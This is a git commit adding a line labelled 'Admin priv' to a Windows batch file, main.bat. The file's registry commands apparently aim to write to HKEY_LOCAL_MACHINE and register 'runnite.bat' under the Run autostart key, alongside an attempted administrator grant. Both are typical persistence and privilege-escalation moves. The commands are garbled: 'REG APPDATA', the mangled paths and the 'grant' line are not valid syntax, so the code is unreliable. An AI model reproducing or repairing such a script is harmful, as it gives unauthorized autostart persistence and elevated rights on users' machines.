4859df7dd52679837ce5a2521a2d023ba272b8bd
Sanket <98463682+sanket8495@users.noreply.github.com>
2023-01-16 14:29:09 +0530

    Admin priv

--- main.bat
+++ main.bat
@@ -1,3 +1,5 @@
+../grant administrator:Y
+
 REG APPDATA "//..\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XTR" /T REG_DWORD /D 0 /F > teraType.rnt
 REG APPDATA "//..\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d runnite.bat
 
